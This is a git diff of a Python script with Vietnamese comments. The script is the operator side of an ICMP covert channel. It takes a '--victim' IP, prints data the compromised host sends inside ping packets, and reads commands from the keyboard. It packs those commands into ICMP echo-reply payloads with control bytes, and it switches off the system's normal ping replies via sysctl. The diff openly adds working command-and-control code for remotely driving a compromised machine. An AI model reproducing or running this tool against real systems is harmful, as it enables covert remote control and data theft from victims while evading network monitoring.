@@ -15,7 +15,7 @@ Trong phần này mình sẽ build phần icmp server
 Vậy phía server sẽ gởi  gói icmp replay
 Đối với
 """
-
+import argparse
 import os, sys, socket, struct, select, time
 
 
@@ -68,10 +68,8 @@ def checksum(source_string):
 def receive_one_ping(my_socket, victim_ip):
 
     """
-    nhận 1 ping từ socker
+    nhận 1 ping từ socket
     """
-    # my_socket.setblocking(0)
-    # my_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
     # Make standard input a non-blocking file
     stdin_fd = sys.stdin.fileno()
@@ -101,22 +99,35 @@ def receive_one_ping(my_socket, victim_ip):
                 )
 
                 if type == 8:
-                    data = buff_packet[28:]
+                    header_control = buff_packet[28]
+                    data = buff_packet[29:]
 
-                     # in ra mang hinh
-                    if len(data) > 0:
-                        out = out + data
+                    # lấy gói header của server site
+                    if header_control == "0":
 
-                    if len(data) == 0:
-                        sys.stdout.write(out)
-                        sys.stdout.flush()
-                        out = ""
+                        # in ra mang hinh thông tin của victime
+                        if len(data) > 0:
+                            data = "%s============================================\n" %(data)
+                            sys.stdout.write(data)
+                            sys.stdout.flush()
+
+                    # neu la goi respone co data in ra mang dinh
+                    if header_control == "3":
+                        if len(data) > 0:
+                            sys.stdout.write(data)
+                            sys.stdout.flush()
+
+                     # neu la goi respone khong co data thi thi ko lam gi
 
                     # doc tu ban phim
                     try:
-                        cmd = sys.stdin.readline()
+                        # neu co lenh thu thi byte
+                        # byte 28 = 2
+                        cmd = "2"+sys.stdin.readline()
                     except:
-                        pass
+                        # khong co lenh thuc hien byte
+                        # byte 28 = 1
+                        cmd = "1slient"
 
                     if cmd == 'exit\n':
                         return
@@ -140,25 +151,27 @@ def send_replay_ping(my_socket, dest_addr, identifier, sequence, cmd):
 
     my_checksum = 0
 
-    # Make a dummy heder with a 0 checksum.
-    header = struct.pack("bbHHh", ICMP_ECHO_REPLAY, 0, my_checksum, identifier, 1)
+    # Tạo check sum header vào gói replay
+    header = struct.pack("bbHHh", ICMP_ECHO_REPLAY, 0, my_checksum, identifier, sequence)
 
-    data = struct.pack("d", default_timer()) + cmd
+    # nếu là gói ping bình thường sẽ set time vào data payload
+    # data = struct.pack("d", default_timer())
+    # gói này nhét command vào payload
+    data = cmd
 
-    # Calculate the checksum on the data and the dummy header.
+    # Tính toán checksum header và data
     my_checksum = checksum(header + data)
 
-    # Now that we have the right checksum, we put that in. It's just easier
-    # to make up a new header than to stuff it into the dummy.
+    # đóng gói lại header ICMP với checksum header
     header = struct.pack(
-        "bbHHh", ICMP_ECHO_REPLAY, 0, my_checksum, identifier, sequence
+        "bbHHh", ICMP_ECHO_REPLAY, 0, socket.htons(my_checksum), identifier, sequence
     )
-    packet = header + data
-    my_socket.sendto(packet, (dest_addr, 1))  # Don't know about the 1
-
-if __name__ == '__main__':
 
 
+    # gới gói header + data
+    my_socket.sendto(header + data, (dest_addr, 1))
+
+def main(ip_victim):
     try:
         my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     except socket.error, (errno, msg):
@@ -171,11 +184,24 @@ if __name__ == '__main__':
             raise socket.error(msg)
         raise  # raise the original error
 
-
     # nhập gói request
     try:
-        receive_one_ping(my_socket,"192.168.6.204")
+        receive_one_ping(my_socket, ip_victim)
     except KeyboardInterrupt:
         print "exit"
         my_socket.close()
         sys.exit(1)
+
+if __name__ == '__main__':
+
+    parse = argparse.ArgumentParser()
+    parse.add_argument("--victim", help="chọn ip victim", required=True)
+    arg_input = parse.parse_args()
+
+    # tắt icmp replay của OS
+    os.system("sysctl -w net.ipv4.icmp_echo_ignore_all=1")
+    try:
+        main(arg_input.victim)
+    except KeyboardInterrupt:
+        os.system("sysctl -w net.ipv4.icmp_echo_ignore_all=0")
+
